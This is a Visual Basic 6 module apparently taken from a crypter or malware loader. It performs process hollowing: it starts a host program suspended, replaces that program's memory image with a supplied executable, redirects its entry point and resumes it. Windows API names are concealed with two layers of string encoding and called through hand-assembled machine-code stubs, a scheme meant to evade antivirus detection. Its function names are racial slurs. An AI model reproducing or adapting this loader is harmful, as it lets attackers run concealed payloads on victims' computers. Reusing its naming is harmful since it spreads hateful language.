Attribute VB_Name = "modMemoryExecution"
Option Explicit


Private Declare Sub RtlMoveMemory Lib "kernel32" (Dest As Any, Src As Any, ByVal L As Long)
Private Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long

Private Const CONTEXT_FULL              As Long = &H10007
Private Const MAX_PATH                  As Integer = 260
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40


Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadID As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord As Long
    StatusWord As Long
    TagWord As Long
    ErrorOffset As Long
    ErrorSelector As Long
    DataOffset As Long
    DataSelector As Long
    RegisterArea(1 To 80) As Byte
    Cr0NpxState As Long
End Type

Private Type CONTEXT
    ContextFlags As Long

    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long

    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_SECTION_HEADER
    SecName As String * 8
    VirtualSize As Long
    VirtualAddress  As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLinenumbers As Long
    NumberOfRelocations As Integer
    NumberOfLinenumbers As Integer
    characteristics  As Long
End Type

Public Function SchwarzerNigger(ByVal sLib As String, ByVal sMod As String, ParamArray Params()) As Long
    Dim bvASM(64)   As Byte 'enought to hold code + 10 params
    Dim i           As Long
    Dim lPos        As Long
    Dim sVal        As String

    bvASM(0) = &H58: bvASM(1) = &H59: bvASM(2) = &H59
    bvASM(3) = &H59: bvASM(4) = &H59: bvASM(5) = &H50
   
    lPos = 6
   
    For i = UBound(Params) To 0 Step -1
        bvASM(lPos) = &H68: lPos = lPos + 1
        sVal = (Params(i)): GoSub PutLong: lPos = lPos + 4
    Next
   
    bvASM(lPos) = &HE8: lPos = lPos + 1
    sVal = GetProcAddress(LoadLibraryA(sLib), sMod) - VarPtr(bvASM(lPos)) - 4
    GoSub PutLong: lPos = lPos + 4
    bvASM(lPos) = &HC3
    SchwarzerNigger = CallWindowProcA(VarPtr(bvASM(0)), 0, 0, 0, 0)
   
    Exit Function
PutLong:
   
    sVal = Right$(String(8, "0") & Hex(sVal), 8)
    bvASM(lPos + 0) = ("&h" & Mid$(sVal, 7, 2))
    bvASM(lPos + 1) = ("&h" & Mid$(sVal, 5, 2))
    bvASM(lPos + 2) = ("&h" & Mid$(sVal, 3, 2))
    bvASM(lPos + 3) = ("&h" & Mid$(sVal, 1, 2))
    Return
End Function

Sub RoterNigger(ByVal sHost As String, ByRef bvBuff() As Byte, Optional parameter As String)
    Dim i       As Long
    Dim Pidh    As IMAGE_DOS_HEADER
    Dim Pinh    As IMAGE_NT_HEADERS
    Dim Pish    As IMAGE_SECTION_HEADER
    Dim Si      As STARTUPINFO
    Dim Pi      As PROCESS_INFORMATION
    Dim Ctx     As CONTEXT

    Si.cb = Len(Si)
    Call SchwarzerNigger(BraunerNigger(WeiﬂerNigger("3357553F33665E4B33473F3733484D3C33665E4B336D5B54334E382933723369")), BraunerNigger(WeiﬂerNigger("335C3337335F6336335C3545337A4257335E533E333F325933665E4B337A425733404227333C722533484D2E335865223366604D")), VarPtr(Pidh), VarPtr(bvBuff(0)), Len(Pidh))
    Call SchwarzerNigger(BraunerNigger(WeiﬂerNigger("3357553F33665E4B33473F3733484D3C33665E4B336D5B54334E382933723369")), BraunerNigger(WeiﬂerNigger("335C3337335F6336335C3545337A4257335E533E333F325933665E4B337A425733404227333C722533484D2E335865223366604D")), VarPtr(Pinh), VarPtr(bvBuff(Pidh.e_lfanew)), Len(Pinh))
   
    Call SchwarzerNigger(BraunerNigger(WeiﬂerNigger("3357553F33665E4B33473F3733484D3C33665E4B336D5B54334E382933723369")), BraunerNigger(WeiﬂerNigger("337D6D79333C715033473D453362217C3357572D33436E3633495B3633633266336C4D36334D2B573355376F33473F2933665E4F336B3A72")), 0, StrPtr(sHost), StrPtr(parameter), 0, 0, CREATE_SUSPENDED, 0, 0, VarPtr(Si), VarPtr(Pi))
    SchwarzerNigger BraunerNigger(WeiﬂerNigger("333F3354335F633633473D523356475F333C722F")), BraunerNigger(WeiﬂerNigger("33473C54333F326F33425E71333C717833425F66336E68413360715F3371293F335537273373475D335C3651337A417C333E233833462E4B336F784E33564560336D5C72335B2470334A6B6633452136")), Pi.hProcess, Pinh.OptionalHeader.ImageBase
    SchwarzerNigger BraunerNigger(WeiﬂerNigger("3357553F33665E4B33473F3733484D3C33665E4B336D5B54334E382933723369")), BraunerNigger(WeiﬂerNigger("3378247B334F493B33447D5F336D5C7233495D3F3356462733425F7233484B60336B3C76335C354533425F4E335C33583373446E333E2476")), Pi.hProcess, Pinh.OptionalHeader.ImageBase, Pinh.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE
    Call SchwarzerNigger(BraunerNigger(WeiﬂerNigger("3357553F33665E4B33473F3733484D3C33665E4B336D5B54334E382933723369")), BraunerNigger(WeiﬂerNigger("336B3A723360713133687C293357572D33607057336F76513341515D335E533E335E523F336F784E336070773363324E33643D5433436E36335F613733484D2E33473F373366604D")), Pi.hProcess, Pinh.OptionalHeader.ImageBase, VarPtr(bvBuff(0)), Pinh.OptionalHeader.SizeOfHeaders, 0)

    For i = 0 To Pinh.FileHeader.NumberOfSections - 1
   
        RtlMoveMemory Pish, bvBuff(Pidh.e_lfanew + 248 + 40 * i), Len(Pish)
        Call SchwarzerNigger(BraunerNigger(WeiﬂerNigger("3357553F33665E4B33473F3733484D3C33665E4B336D5B54334E382933723369")), BraunerNigger(WeiﬂerNigger("336B3A723360713133687C293357572D33607057336F76513341515D335E533E335E523F336F784E336070773363324E33643D5433436E36335F613733484D2E33473F373366604D")), Pi.hProcess, Pinh.OptionalHeader.ImageBase + Pish.VirtualAddress, VarPtr(bvBuff(Pish.PointerToRawData)), Pish.SizeOfRawData, 0)
    Next i

    Ctx.ContextFlags = CONTEXT_FULL
    SchwarzerNigger BraunerNigger(WeiﬂerNigger("3357553F33665E4B33473F3733484D3C33665E4B336D5B54334E382933723369")), BraunerNigger(WeiﬂerNigger("3368786F333E234233687C6933654D473372393C3341515D336A2D5A336B3C2E335C334433632E32333F334933484D3C33553857333E2342334E3C70333B636F")), Pi.hThread, VarPtr(Ctx)
    Call SchwarzerNigger(BraunerNigger(WeiﬂerNigger("3357553F33665E4B33473F3733484D3C33665E4B336D5B54334E382933723369")), BraunerNigger(WeiﬂerNigger("336B3A723360713133687C293357572D33607057336F76513341515D335E533E335E523F336F784E336070773363324E33643D5433436E36335F613733484D2E33473F373366604D")), Pi.hProcess, Ctx.Ebx + 8, VarPtr(Pinh.OptionalHeader.ImageBase), 4, 0)
    Ctx.Eax = Pinh.OptionalHeader.ImageBase + Pinh.OptionalHeader.AddressOfEntryPoint
    SchwarzerNigger BraunerNigger(WeiﬂerNigger("3357553F33665E4B33473F3733484D3C33665E4B336D5B54334E382933723369")), BraunerNigger(WeiﬂerNigger("335C3324336A2D5A333F326F336E677D33665D60335E5259333E23423374563D3352763E33447B74334A6B6633505957334D2C4E335B256333676E34336B3E3F")), Pi.hThread, VarPtr(Ctx)
    SchwarzerNigger BraunerNigger(WeiﬂerNigger("3357553F33665E4B33473F3733484D3C33665E4B336D5B54334E382933723369")), BraunerNigger(WeiﬂerNigger("334F4936334F497B3355386A336D5C56335C353033473D45335C326E3340416333473F37335E517233676C78335C3344")), Pi.hThread
End Sub



Public Function WeiﬂerNigger(ByVal strData As String)
Dim i As Long, CryptString As String, tmpChar As String
    On Local Error Resume Next
    For i = 1 To Len(strData) Step 2
        CryptString = CryptString & Chr$(Val("&H" & Mid$(strData, i, 2)))
    Next i
    WeiﬂerNigger = CryptString
End Function
Public Function BraunerNigger(ByVal StringToBraunerNigger As String) As String

Remarks:

OnError:
    On Error GoTo ErrHandler

Dimensions:
    Dim intMousePointer As Integer
    Dim dblCountLength As Double
    Dim intLengthChar As Integer
    Dim strCurrentChar As String
    Dim dblCurrentChar As Double
    Dim intCountChar As Integer
    Dim intRandomSeed As Integer
    Dim intBeforeMulti As Integer
    Dim intAfterMulti As Integer
    Dim intSubNinetyNine As Integer
    Dim intInverseAsc As Integer

Constants:
 

MainCode:
    Let intMousePointer = Screen.MousePointer
    Let Screen.MousePointer = vbHourglass
    For dblCountLength = 1 To Len(StringToBraunerNigger)
        Let intLengthChar = Mid(StringToBraunerNigger, dblCountLength, 1)
        Let strCurrentChar = Mid(StringToBraunerNigger, dblCountLength + 1, _
            intLengthChar)
        Let dblCurrentChar = 0
        For intCountChar = 1 To Len(strCurrentChar)
            Let dblCurrentChar = dblCurrentChar + (Asc(Mid(strCurrentChar, _
                intCountChar, 1)) - 33) * (93 ^ (Len(strCurrentChar) - _
                intCountChar))
        Next intCountChar
        '   Determine the random number that was used in the 'Encrypt' function
        Let intRandomSeed = Mid(dblCurrentChar, 3, 2)
        Let intBeforeMulti = Mid(dblCurrentChar, 1, 2) & Mid(dblCurrentChar, 5, _
            2)
        Let intAfterMulti = intBeforeMulti / intRandomSeed
        Let intSubNinetyNine = intAfterMulti - 99
        Let intInverseAsc = 256 - intSubNinetyNine
        Let BraunerNigger = BraunerNigger & Chr(intInverseAsc)
        '   Add the variable 'intLengthChar' to 'dblCountLength' to ensure that
        '   the next character is being analyzed
        Let dblCountLength = dblCountLength + intLengthChar
    '   Go to the next character in the variable 'StringToEncrypt'
    Next dblCountLength
    Let Screen.MousePointer = intMousePointer
    Exit Function

ErrHandler:
    Select Case Err.Number
        Case Else
            Err.Clear
            Resume Next
    End Select

End Function



